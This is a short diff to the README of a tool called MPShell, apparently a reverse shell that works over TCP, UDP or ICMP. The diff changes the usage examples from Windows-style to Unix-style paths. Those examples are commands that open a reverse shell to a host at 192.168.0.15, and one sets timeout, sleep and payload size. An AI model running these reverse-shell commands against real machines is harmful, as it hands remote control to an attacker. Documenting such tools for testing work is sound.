@@ -45,9 +45,9 @@ To start a ICMP listener, root is required, given that raw sockets are used, and
 **Starting a reverse shell**
 
 ```
-.\MPShell --protocol=tcp --host=192.168.0.15 --port=8080
-.\MPShell --protocol=udp --host=192.168.0.15 --port=8080
-.\MPShell --protocol=icmp --host=192.168.0.15
+./MPShell --protocol=tcp --host=192.168.0.15 --port=8080
+./MPShell --protocol=udp --host=192.168.0.15 --port=8080
+./MPShell --protocol=icmp --host=192.168.0.15
 ```
 
 &nbsp;
@@ -56,4 +56,4 @@ To start a ICMP listener, root is required, given that raw sockets are used, and
 
 The following line set's the read timeout to 1 second, sleep between packets (when there is no payload to send) to 500 ms, and the payload size to 1000 bytes.
 
-```.\MPShell --protocol=udp --host=192.168.0.15 --port=8080 --timeout=2 --sleep=500 --payload-size=1000```
+```./MPShell --protocol=udp --host=192.168.0.15 --port=8080 --timeout=2 --sleep=500 --payload-size=1000```
